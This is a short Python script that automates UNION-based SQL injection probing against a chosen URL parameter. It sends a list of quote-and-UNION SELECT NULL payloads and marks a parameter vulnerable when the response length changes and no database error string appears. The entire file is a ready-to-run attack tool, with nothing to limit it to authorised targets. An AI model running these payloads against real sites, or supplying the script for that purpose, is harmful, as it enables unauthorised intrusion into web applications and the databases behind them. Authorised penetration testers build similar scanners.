import re
import urllib.parse
import urllib.request

ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning: mysql", re.I),
    re.compile(r"unclosed quotation mark after the character string", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
]

PAYLOADS = [
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
    '" UNION SELECT NULL-- ',
    '" UNION SELECT NULL,NULL-- ',
    '" UNION SELECT NULL,NULL,NULL-- ',
]


def fetch(url: str) -> str:
    """Fetch a URL and return the response body as text."""
    with urllib.request.urlopen(url) as resp:
        return resp.read().decode('utf-8', errors='replace')


def test_parameter(url: str, param: str, value: str):
    """Attempt UNION-based SQL injection on a single parameter."""
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    original = query.get(param, [''])[0]

    # Get baseline response length for comparison
    try:
        baseline_body = fetch(url)
    except Exception as e:
        baseline_body = str(e)
    baseline_len = len(baseline_body)

    results = []
    for payload in PAYLOADS:
        query[param] = original + payload
        new_query = urllib.parse.urlencode(query, doseq=True)
        new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        try:
            body = fetch(new_url)
        except Exception as e:
            body = str(e)
        error = any(p.search(body) for p in ERROR_PATTERNS)
        length_diff = len(body) != baseline_len
        vulnerable = length_diff and not error
        results.append({
            'url': new_url,
            'param': param,
            'payload': payload,
            'vulnerable': vulnerable,
        })
    return results
